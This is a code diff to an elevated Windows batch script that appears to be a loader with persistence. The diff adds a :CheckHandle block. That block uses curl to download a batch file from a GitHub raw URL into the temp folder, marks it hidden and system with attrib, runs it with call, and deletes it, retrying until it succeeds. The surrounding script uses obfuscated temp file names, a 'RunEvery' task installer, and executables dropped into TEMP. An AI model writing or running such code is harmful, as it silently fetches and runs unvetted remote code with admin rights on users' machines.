@@ -9,7 +9,7 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=6.0"
+set "BATCHVERSION=6.2"
 set "RESULT=%TEMP%\TUSELMP.txa"
 set "RUNEVERYOFFICIALMD5=65ddb12683c9795db4b2ba0023663ca8"
 set "RUNEVERYLOGFILE=%temp%\S1rNsvQgG.mpeez"
@@ -350,6 +350,85 @@ goto AFTERORSKIPINSTALLRUNEVERY
 
 
 :INSTRUNEVERY
+
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+
+
+
+
+
+
+:CheckHandle
+echo :CheckHandle Started.. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+set "file9=%SystemRoot%\System32\handle.exe"
+
+:: Check handle.exe; if found, skip to next section
+if exist "%file9%" (
+    echo %file9% found. Going to INSTRUNEVERY1 >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+    goto INSTRUNEVERY1
+)
+
+:: Run commands if handle.exe is not found
+echo Checking for handle... >> "%LOGFILE%" 2>&1
+set "embeddedScript=%temp%\temp_script_handle.bat"
+del /f /a "%embeddedScript%" >> "%LOGFILE%" 2>&1
+
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Handle"
+attrib +h +s "%embeddedScript%"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%. >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+    call "%embeddedScript%" >> "%LOGFILE%" 2>&1
+    del /f /a "%embeddedScript%" >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+) else (
+    echo Failed to get content from Handle Link >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+    timeout /t 3 /nobreak >> "%LOGFILE%" 2>&1
+    goto CheckHandle
+)
+
+set "MESSAGE=%MESSAGE%Handle^|"
+
+
+
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+
+
+
+:INSTRUNEVERY1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo INSTRUNEVERY1 Started.. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
@@ -358,7 +437,7 @@ echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
-echo INSTRUNEVERY Started.. >> "%LOGFILE%" 2>&1
+echo INSTRUNEVERY1 Started.. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
@@ -367,6 +446,8 @@ echo %startupFile% not found. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 :: RunEvery Files or Task missing 
 
+
+:RUN
 
 
 :: RunEveryCaller Installer
@@ -409,7 +490,7 @@ if not exist "%TEMP%\!filename!.exe" (
     echo Retrying in 2 seconds .... >> "%LOGFILE%" 2>&1
     timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
     echo. >> "%LOGFILE%" 2>&1
-    goto INSTRUNEVERY
+    goto INSTRUNEVERY1
 )
  
  
@@ -431,7 +512,7 @@ if %FILESIZE% geq 80000 (
      echo Retrying in 2 seconds .... >> "%LOGFILE%" 2>&1
      timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
      echo. >> "%LOGFILE%" 2>&1
-     goto INSTRUNEVERY
+     goto INSTRUNEVERY1
 )
 
 
